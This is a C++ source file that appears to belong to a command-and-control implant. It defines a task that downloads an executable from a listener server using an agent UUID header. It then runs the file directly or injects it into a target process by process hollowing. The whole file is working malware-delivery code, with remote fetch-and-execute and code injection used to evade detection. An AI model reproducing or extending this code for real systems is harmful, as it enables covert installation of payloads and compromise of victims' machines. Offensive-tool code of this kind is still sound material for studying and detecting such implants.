#include "core/task.hpp"

namespace Task
{
    std::wstring Pe(
        State::PSTATE pState,
        const std::wstring& wTargetProcess,
        const std::wstring& wSrc,
        const std::wstring& wTechnique
    ) {        
        std::wstring result;

        // DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
        
        // Download PE
        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
        std::vector<BYTE> bytes = System::Http::DataDownload(
            pState->pProcs,
            pState->pCrypt,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            wHeaders.c_str(),
            wSrc
        );
        if (bytes.size() == 0)
        {
            return L"Error: Failed to get DLL.";
        }

        // Execute
        if (wcscmp(wTechnique.c_str(), L"direct-execution") == 0)
        {
            if (!Technique::Injection::DirectExecution(pState->pProcs, bytes))
            {
                return L"Error: Failed to inject an executable.";
            }
        }
        else if (wcscmp(wTechnique.c_str(), L"process-hollowing") == 0)
        {
            if (!Technique::Injection::ProcessHollowing(
                pState->pProcs,
                wTargetProcess,
                bytes
            )) {
                return L"Error: Failed to inject an executable.";
            }
        }

        return L"Success: exe file has been executed.";
    }
}